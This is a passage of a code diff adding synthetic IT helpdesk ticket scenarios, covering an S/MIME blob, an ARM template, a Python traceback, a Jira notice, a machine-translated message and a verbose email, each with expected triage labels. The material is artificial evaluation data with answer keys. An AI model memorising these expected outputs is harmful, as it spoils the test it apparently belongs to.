+                "MIIBygYJKoZIhvcNAQcDoIIBuzCCAbc"
+                "CAQAxggFhMIIBXQIBADBFMDExLzAtBgNV"
+                "BAMMJkNvbnRvc28gRmluYW5jaWFsIFNl"
+                "cnZpY2VzIFJvb3QgQ0ECEBxGb3LJ0fR7"
+                "0lJ5p1LMk8EwDQYJKoZIhvcNAQEBBQAE"
+                "ggEAk8d2fD4MCuqxPl9rp7q3mJfXz2jP"
+                "Q2nVdK7xT8TsFGJa0qZi6YXCB4p5L6n"
+                "3+4EAAAAAAAAAAAA\n\n"
+                "I am getting the raw S/MIME content above instead of the actual "
+                "email body. My S/MIME certificate expired and Outlook can no longer "
+                "decrypt messages from the compliance team. I need a new certificate "
+                "issued. Using Outlook 16.0.18025 on Windows 11.\n\n"
+                "Nadia Petrova\nCompliance"
+            ),
+            reporter=_reporter("Nadia Petrova", "n.petrova@contoso.com", "Compliance"),
+            created_at="2026-03-18T08:45:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Security & Compliance",
+            priority="P2",
+            assigned_team="Security Operations",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-146: Azure ARM template JSON dump
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-146",
+        name="Azure ARM template JSON dump",
+        description=(
+            "User pasted a large ARM template JSON with resource definitions."
+        ),
+        category=_CATEGORY,
+        tags=["arm_template", "azure_json", "infrastructure"],
+        ticket=EvalTicket(
+            ticket_id="INC-5146",
+            subject="Azure resource group deployment failed",
+            description=(
+                "Our ARM template deployment is failing. Template:\n\n"
+                '{"$schema":"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",'
+                '"contentVersion":"1.0.0.0",'
+                '"parameters":{"location":{"type":"string","defaultValue":"eastus2"},'
+                '"vmSize":{"type":"string","defaultValue":"Standard_D4s_v3"}},'
+                '"resources":['
+                '{"type":"Microsoft.Compute/virtualMachines",'
+                '"apiVersion":"2023-09-01",'
+                '"name":"vm-contoso-trade-01",'
+                "\"location\":\"[parameters('location')]\","
+                "\"properties\":{\"hardwareProfile\":{\"vmSize\":\"[parameters('vmSize')]\"},"
+                '"storageProfile":{"imageReference":{"publisher":"MicrosoftWindowsServer",'
+                '"offer":"WindowsServer","sku":"2022-datacenter-g2","version":"latest"}},'
+                '"osProfile":{"computerName":"trade-01","adminUsername":"contosoadmin"},'
+                "\"networkProfile\":{\"networkInterfaces\":[{\"id\":\"[resourceId("
+                "'Microsoft.Network/networkInterfaces','nic-trade-01')]\"}]}}},"
+                '{"type":"Microsoft.Network/networkInterfaces",'
+                '"apiVersion":"2023-09-01",'
+                '"name":"nic-trade-01",'
+                "\"location\":\"[parameters('location')]\","
+                '"properties":{"ipConfigurations":[{"name":"ipconfig1",'
+                "\"properties\":{\"subnet\":{\"id\":\"[resourceId("
+                "'Microsoft.Network/virtualNetworks/subnets',"
+                "'vnet-contoso-prod','snet-compute')]\"}}}]}}]}\n\n"
+                "Error: InsufficientQuota - Subscription does not have enough "
+                "Standard_D4s_v3 quota in eastus2 (requested: 4, available: 0).\n\n"
+                "We need this VM for the new trading platform.\n"
+                "Priya Sharma\nCloud Infrastructure"
+            ),
+            reporter=_reporter("Priya Sharma", "p.sharma@contoso.com", "Cloud Infrastructure"),
+            created_at="2026-03-18T09:00:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Data & Storage",
+            priority="P2",
+            assigned_team="Data Platform",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-147: Python traceback with very long module paths
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-147",
+        name="Python traceback with deep virtualenv paths",
+        description=(
+            "Full Python traceback with extremely long virtualenv paths."
+        ),
+        category=_CATEGORY,
+        tags=["deep_traceback", "venv_paths", "python_crash"],
+        ticket=EvalTicket(
+            ticket_id="INC-5147",
+            subject="Internal Python risk calculation tool crashing",
+            description=(
+                "The risk calculator crashes on startup. Full traceback:\n\n"
+                "Traceback (most recent call last):\n"
+                "  File \"/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/"
+                "uvicorn/protocols/http/h11_impl.py\", line 404, in run_asgi\n"
+                "    result = await app(scope, receive, send)\n"
+                "  File \"/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/"
+                "starlette/applications.py\", line 123, in __call__\n"
+                "    await self.middleware_stack(scope, receive, send)\n"
+                "  File \"/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/"
+                "starlette/middleware/errors.py\", line 186, in __call__\n"
+                "    raise exc\n"
+                "  File \"/opt/contoso/apps/risk-engine/src/contoso/risk/engine/core/"
+                "portfolio_calculator.py\", line 247, in calculate_var\n"
+                "    return self._monte_carlo_simulation(positions, confidence)\n"
+                "  File \"/opt/contoso/apps/risk-engine/src/contoso/risk/engine/core/"
+                "simulation.py\", line 89, in _monte_carlo_simulation\n"
+                "    cov_matrix = np.cov(returns_matrix, rowvar=False)\n"
+                "numpy.linalg.LinAlgError: Singular matrix\n\n"
+                "The tool uses Python 3.12.2, numpy 1.26.4, on RHEL 9.\n\n"
+                "Vikram Patel\nQuantitative Analysis"
+            ),
+            reporter=_reporter("Vikram Patel", "v.patel@contoso.com", "Quantitative Analysis"),
+            created_at="2026-03-18T06:45:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-148: Jira notification template noise
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-148",
+        name="Jira notification template noise",
+        description=(
+            "Full Jira notification email with headers, status history, and custom fields."
+        ),
+        category=_CATEGORY,
+        tags=["jira_notification", "template_noise", "status_history"],
+        ticket=EvalTicket(
+            ticket_id="INC-5148",
+            subject="FW: [JIRA] (PLAT-4521) Updated: Jira board not loading",
+            description=(
+                "This message was sent by Atlassian Jira (v9.12.0#9120000)\n\n"
+                "--- Notification from Jira ---\n"
+                "PLAT-4521 was updated by System Administrator\n\n"
+                "Project: Platform Engineering (PLAT)\n"
+                "Issue Type: Bug\n"
+                "Priority: High\n"
+                "Status: In Progress -> Open (was: In Progress)\n"
+                "Assignee: Unassigned (was: jira-admin@contoso.com)\n"
+                "Reporter: maria.costa@contoso.com\n"
+                "Created: 2026-03-17T15:30:00+0000\n"
+                "Updated: 2026-03-18T08:00:00+0000\n\n"
+                "Change History:\n"
+                "  [18/Mar/26 08:00] Status changed from In Progress to Open\n"
+                "  [17/Mar/26 16:00] Status changed from Open to In Progress\n"
+                "  [17/Mar/26 15:30] Issue created\n\n"
+                "Custom Fields:\n"
+                "  Sprint: Sprint 47 (Mar 11 - Mar 25)\n"
+                "  Story Points: 3\n"
+                "  Components: Frontend, API\n"
+                "  Labels: production-issue, p1-candidate\n\n"
+                "--- End of notification ---\n\n"
+                "THE ACTUAL ISSUE: Our Jira board (Platform Engineering project) "
+                "won't load in any browser. It shows a blank white page with a "
+                "spinning loader that never completes. The REST API at "
+                "jira.contoso.com/rest/api/2/search works fine. Seems like a "
+                "frontend issue. Started after the Jira 9.12.0 upgrade.\n\n"
+                "Maria Costa\nPlatform Engineering"
+            ),
+            reporter=_reporter("Maria Costa", "m.costa@contoso.com", "Platform Engineering"),
+            created_at="2026-03-18T08:15:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-149: Auto-translated ticket with translation artifacts
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-149",
+        name="Auto-translated ticket with translation artifacts",
+        description=(
+            "Machine-translated text with [Translated from Japanese] markers "
+            "and awkward machine translation phrasing."
+        ),
+        category=_CATEGORY,
+        tags=["auto_translated", "translation_markers", "japanese_english"],
+        ticket=EvalTicket(
+            ticket_id="INC-5149",
+            subject="[Translated from Japanese] Keyboard of the desk does not function",
+            description=(
+                "[This message was automatically translated from Japanese]\n"
+                "[Original language: ja-JP | Confidence: 0.82]\n\n"
+                "Honorable IT support team,\n\n"
+                "The keyboard which is on my desk is not doing the function. "
+                "When I am pressing the keys, the letters which should appear do "
+                "not appear on the screen of the monitor. The keyboard (model: "
+                "Microsoft Ergonomic Keyboard, serial: MSER-2026-0419) was "
+                "performing the normal function until the morning of today.\n\n"
+                "The things I have already tried doing:\n"
+                "- The USB cable was removed and inserted again [re-plugging]\n"
+                "- The computer machine was restarted [reboot]\n"
+                "- A different USB mouth [port] was used\n"
+                "- The keyboard was tested on a colleague person's computer "
+                "machine and it did the function normally\n\n"
+                "I think the USB controller of my computer machine has become "
+                "broken. My computer is Dell Latitude 5540, the Windows 11.\n\n"
+                "[Translator note: some terms may be imprecise]\n\n"
+                "With respectful regards,\n"
+                "Tanaka Yuki\n"
+                "\u7530\u4e2d \u7531\u7d00\n"
+                "Trading Department, Tokyo Office"
+            ),
+            reporter=_reporter("Tanaka Yuki", "y.tanaka@contoso.com", "Trading"),
+            created_at="2026-03-18T01:30:00Z",
+            channel="portal",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Hardware & Peripherals",
+            priority="P3",
+            assigned_team="Endpoint Engineering",
+        ),
+    )
+)
+
+
+# ---------------------------------------------------------------------------
+# dc-150: Extremely verbose email with buried issue
+# ---------------------------------------------------------------------------
+default_registry.register(
+    EvalScenario(
+        scenario_id="dc-150",
+        name="Extremely verbose rambling email with buried issue",
+        description=(
+            "2000+ character email where the user rambles about their day "
+            "with the actual IT issue buried deep in the middle."
+        ),
+        category=_CATEGORY,
+        tags=["extremely_verbose", "buried_issue", "rambling_email"],
+        ticket=EvalTicket(
+            ticket_id="INC-5150",
+            subject="Having a terrible day and EVERYTHING is going wrong including my monitor",
+            description=(
+                "Hi IT team,\n\n"
+                "I hope you are having a better day than I am because let me tell "
+                "you, today has been absolutely TERRIBLE. First, my alarm didn't "
+                "go off because apparently my phone decided to update overnight and "
+                "reset all my alarms. So I was already 30 minutes late to work. "
+                "Then the coffee machine on Floor 4 was broken AGAIN (I know that's "
+                "not your department but seriously someone needs to fix that thing). "
+                "Then I get to my desk and discover that Outlook has 247 unread "
+                "emails because I was out sick on Friday and Monday, and half of "
+                "them are those automated Confluence digest emails that nobody reads "
+                "but nobody knows how to unsubscribe from.\n\n"
+                "So I'm trying to work through my emails and I notice that my "
+                "external monitor (it's a Dell U2722D, 27-inch, the nice one that "
+                "I specifically requested when I started because I do a lot of "
+                "spreadsheet work and the standard 24-inch monitors are too small "
+                "for what I need) is flickering. Like, the screen goes black for "
+                "about half a second every 30-60 seconds. It's driving me absolutely "
+                "insane. It started this morning.\n\n"
+                "I tried all the things I could think of — unplugging the USB-C "
+                "cable and plugging it back in, trying a different USB-C port, "
+                "restarting my laptop, even trying an HDMI cable instead (which "
+                "works but at lower resolution which defeats the purpose of having "
+                "a 4K monitor). The flickering only happens on USB-C at 4K 60Hz.\n\n"
+                "Oh and while I'm at it, can someone also look into why the Wi-Fi "
+                "in conference room 4B is always terrible? Every time I have a "
+                "Teams call in there it drops. But the monitor thing is more "
+                "urgent because I literally cannot work like this.\n\n"
+                "Also, I heard from Janet in HR that we're getting new docking "
+                "stations next quarter? Is that true? Because maybe that would "
+                "fix my monitor issue if it's a docking station problem. I'm "
+                "currently using the CalDigit TS3 Plus that was already on my "
+                "desk when I started.\n\n"
+                "Please help with the monitor flickering ASAP. I have a big "
+                "presentation to the board tomorrow and I need both screens "
+                "working.\n\n"
+                "Thanks so much and sorry for the long email,\n"
+                "Patricia Henderson\n"
+                "Financial Analysis | Floor 4, Desk 4-127\n"
+                "x4521"
+            ),
+            reporter=_reporter("Patricia Henderson", "p.henderson@contoso.com", "Finance"),
+            created_at="2026-03-18T09:45:00Z",
+            channel="email",
+        ),
+        expected_triage=ExpectedTriage(
+            category="Hardware & Peripherals",
+            priority="P3",
+            assigned_team="Endpoint Engineering",
+        ),
+    )
+)
